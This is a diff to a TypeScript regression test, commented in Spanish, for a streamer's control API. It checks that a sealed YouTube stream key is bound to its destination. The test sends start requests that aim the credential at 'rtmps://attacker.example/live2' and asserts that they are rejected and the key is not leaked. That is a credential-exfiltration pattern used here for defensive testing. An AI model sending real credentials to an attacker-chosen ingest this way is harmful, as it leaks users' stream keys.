@@ -305,27 +305,39 @@ describe("EQ6b · API interna de control del streamer", () => {
   it("DEFECTO P2 · el sobre sellado NO está atado a su destino: con el secreto interno se reenvía la clave de YouTube a una ingesta arbitraria", async () => {
     const youtubeKey = `yt-${randomBytes(12).toString("hex")}`;
     // Lo que la API guarda en la BD para la plataforma youtube (mismo sealSecret).
-    const sealedForYoutube = sealSecret(youtubeKey, PUB);
+    // EQ5c · ajuste de firma: desde el arreglo, sealSecret exige el destino; se
+    // sella EXACTAMENTE lo que guarda la API para youtube (routes/streaming.ts).
+    const sealedForYoutube = sealSecret(youtubeKey, PUB, {
+      platform: "youtube",
+      ingest: "rtmps://a.rtmps.youtube.com/live2",
+    });
     const evil = await fakeIngest("normal");
     const secret = randomBytes(24).toString("hex");
     const { sup, base } = await controlWith(evil.dial, secret);
     // Quien tenga la BD (sobre) y el secreto x-streamer-auth —p. ej. la API comprometida,
     // que monta ambos— pide arrancar contra SU servidor con el sobre de YouTube.
-    const res = await fetch(`${base}/control/start`, {
-      method: "POST",
-      headers: { "content-type": "application/json", "x-streamer-auth": secret },
-      body: JSON.stringify({
-        sessionId: "s1",
-        mode: "rtmps",
-        ingestUrl: "rtmps://attacker.example/live2",
-        credential: sealedForYoutube,
-      }),
-    });
+    // EQ5c · variante añadida: la orden declara además `platform: "youtube"` (lo
+    // que manda la API real), para que el rechazo dependa de la INGESTA.
+    const statuses: number[] = [];
+    for (const extra of [{}, { platform: "youtube" }]) {
+      const res = await fetch(`${base}/control/start`, {
+        method: "POST",
+        headers: { "content-type": "application/json", "x-streamer-auth": secret },
+        body: JSON.stringify({
+          sessionId: "s1",
+          mode: "rtmps",
+          ingestUrl: "rtmps://attacker.example/live2",
+          credential: sealedForYoutube,
+          ...extra,
+        }),
+      });
+      statuses.push(res.status);
+    }
     await new Promise((r) => setTimeout(r, 800));
     sup.stop();
     // La ingesta ajena NO debe recibir la clave de YouTube (y el streamer debería rechazar la orden).
     expect(evil.seen.published).not.toContain(youtubeKey);
-    expect(res.status).toBeGreaterThanOrEqual(400);
+    for (const st of statuses) expect(st).toBeGreaterThanOrEqual(400);
   });
 
   it("CONTROL · con secreto configurado: sin cabecera o con cabecera errónea ⇒ 401 en /status, /control/* y /recordings*", async () => {
